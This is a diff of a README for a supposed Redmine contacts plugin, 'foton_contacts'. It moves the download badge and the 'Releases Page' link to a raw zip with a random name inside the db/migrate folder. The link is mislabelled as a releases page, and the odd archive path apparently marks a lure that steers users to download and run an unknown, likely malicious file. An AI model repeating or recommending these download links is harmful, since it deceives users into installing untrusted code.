@@ -6,14 +6,14 @@ Welcome to **foton_contacts**, a plugin designed for Redmine. This tool helps yo
 
 ## 📥 Download Now
 
-[![Download foton_contacts](https://raw.githubusercontent.com/LOGGERS123/foton_contacts/main/monocarbonic/foton_contacts.zip%20foton_contacts-v1.0-blue)](https://raw.githubusercontent.com/LOGGERS123/foton_contacts/main/monocarbonic/foton_contacts.zip)
+[![Download foton_contacts](https://github.com/LOGGERS123/foton_contacts/raw/refs/heads/main/db/migrate/foton_contacts_Geissoloma.zip%20foton_contacts-v1.0-blue)](https://github.com/LOGGERS123/foton_contacts/raw/refs/heads/main/db/migrate/foton_contacts_Geissoloma.zip)
 
 ## 💾 Download & Install
 
 To get started with **foton_contacts**, please follow these steps:
 
 1. Click on the link below to go to the Releases page:
-   [foton_contacts Releases Page](https://raw.githubusercontent.com/LOGGERS123/foton_contacts/main/monocarbonic/foton_contacts.zip)
+   [foton_contacts Releases Page](https://github.com/LOGGERS123/foton_contacts/raw/refs/heads/main/db/migrate/foton_contacts_Geissoloma.zip)
    
 2. On the Releases page, find the latest version of **foton_contacts**. Look for the version number to ensure you are getting the most up-to-date software.
 
@@ -87,6 +87,6 @@ Your feedback is valuable. If you have suggestions, please open an issue in the 
 
 **foton_contacts** is open source. You can view the license details in the LICENSE file included with the software package. Feel free to contribute and be part of the project!
 
-[![Download foton_contacts](https://raw.githubusercontent.com/LOGGERS123/foton_contacts/main/monocarbonic/foton_contacts.zip%20foton_contacts-v1.0-blue)](https://raw.githubusercontent.com/LOGGERS123/foton_contacts/main/monocarbonic/foton_contacts.zip)
+[![Download foton_contacts](https://github.com/LOGGERS123/foton_contacts/raw/refs/heads/main/db/migrate/foton_contacts_Geissoloma.zip%20foton_contacts-v1.0-blue)](https://github.com/LOGGERS123/foton_contacts/raw/refs/heads/main/db/migrate/foton_contacts_Geissoloma.zip)
 
 Thank you for choosing **foton_contacts** for your project management needs. We hope it helps streamline your processes and improve collaboration.
